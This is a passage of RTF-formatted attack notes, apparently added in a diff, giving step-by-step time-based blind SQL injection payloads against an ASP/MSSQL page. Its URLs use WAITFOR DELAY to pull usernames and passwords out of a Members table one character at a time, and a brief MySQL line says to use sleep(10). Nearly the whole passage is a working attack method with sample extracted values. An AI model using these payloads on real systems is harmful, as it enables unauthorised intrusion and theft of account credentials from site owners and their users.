+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(substring((SELECT TOP 1 userID from Members),1,1))=49) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\
+
+\f0 Results = 49 = 1
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+\cf1 \
+
+\f0\b Overall Results FOR ROW 1
+\b0 :\
+
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 admin::pass::1
+\f1 \
+\
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f0\b \cf1 EXTRACTION OF 2nd ROW DATA
+\b0 :\
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f1 \cf1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 user from Members where user NOT in ('admin') order by Members desc)=2) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Length Check
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 user from Members where user NOT in ('admin') order by Members desc),1,1)))=72) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+
+\f4 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 user from Members where user NOT in ('admin') order by Members desc),2,1)))=82) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\
+
+\f0 Results = 72 & 82 = HR
+\f1 \
+\
+
+\f0 Repeat as needed using same method as above for ROW 1 to get additional columns for ROW 2. Then we will increment again and use the last found results in our NOT statement to keep things moving along. If we were to keep going it would look like this:
+\f1 \
+\
+
+\f0 http://[site]/page.asp?id=1; IF (LEN(SELECT TOP 1 user from Members where user NOT in ('HR') order by Members desc)=<length-to-check>) WAITFOR DELAY '00:00:10'-- (+10 seconds)\
+
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+
+\f2 \cf1 o
+\f3 \'a0\'a0 
+\f0 Length Check
+\f1 \
+\pard\pardeftab720\sl260\partightenfactor0
+
+\f4 \cf1 \'b7
+\f3 \'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0 
+\f0 http://[site]/page.asp?id=1; IF (ASCII(lower(substring((SELECT TOP 1 user from Members where user NOT in ('HR') order by Members desc),1,1)))<insert<>=here><insert-char-value-here>) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+\f1 \
+\pard\pardeftab720\sl300\partightenfactor0
+\cf1 \
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+
+\b \ul MYSQL
+\b0 \ulnone \
+\
+Use sleep(10)\
+\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+}
